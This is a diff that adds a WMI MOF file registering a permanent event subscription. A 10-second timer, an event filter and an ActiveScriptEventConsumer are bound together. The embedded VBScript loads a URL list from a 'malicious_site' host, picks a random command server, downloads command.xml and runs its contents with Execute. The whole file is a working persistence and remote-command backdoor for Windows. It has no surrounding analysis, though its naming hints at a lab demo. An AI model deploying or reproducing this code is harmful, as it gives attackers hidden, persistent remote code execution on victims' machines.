@@ -1,0 +1,68 @@
+
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __IntervalTimerInstruction as $IntervalTimer
+{
+    TimerId = "ScriptKidTimer";
+    SkipIfPassed = True;
+    IntervalBetweenEvents = 10000;
+};
+
+instance of __EventFilter as $EventFilter
+{
+    EventNamespace = "Root\\Subscription";
+    Name  = "ScriptKidFilter";
+    Query = "Select * From __TimerEvent "
+	        "Where TimerId = \"ScriptKidTimer\"";
+    QueryLanguage = "WQL";
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+    Name = "ScriptKidConsumer";
+    ScriptingEngine = "VBScript";
+    ScriptText = 
+"Option Explicit\n"
+ "Dim objDocument\n"
+ "Dim wshShell\n"
+ "Dim objUrlsNode\n"
+ "Dim intRandomUrlIndex\n"
+ "Dim strCommandUrl\n"
+ "Dim objCommandNode\n"
+ "Dim objFso\n"
+ "\n"
+ "Const strUrlListPage = _\n"
+ "    \"http://192.168.1.12/malicious_site/feed/urllist.xml\"\n"
+ "\n"
+ "Set objFso = CreateObject(\"Scripting.FileSystemObject\")\n"
+ "Set wshShell = CreateObject(\"WScript.Shell\")\n"
+ "\n"
+ "Set objDocument = CreateObject(\"MSXML2.DOMDocument\")\n"
+ "objDocument.async = False\n"
+ "\n"
+ "If objDocument.Load(strUrlListPage) Then\n"
+ "    Set objUrlsNode =  objDocument.childNodes(1)\n"
+ "\n"
+ "    Randomize\n"
+ "    intRandomUrlIndex = Int((objUrlsNode.childNodes.length) * Rnd)\n"
+ "    strCommandUrl =  objUrlsNode.childNodes(intRandomUrlIndex).text\n"
+ "\n"    
+ "    If objDocument.Load(strCommandUrl & \"command.xml\") Then\n"
+ "        Set objCommandNode = objDocument.childNodes(1)\n"
+ "\n"
+ "        Execute objCommandNode.text\n"
+ "    Else\n"
+ "        ' report the problem\n"
+ "    End If\n"
+ "\n" 
+ "Else\n"
+ "    'report the problem obtaining URL\n"
+ "End If\n";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer   = $Consumer;
+    Filter = $EventFilter;
+}; 
+
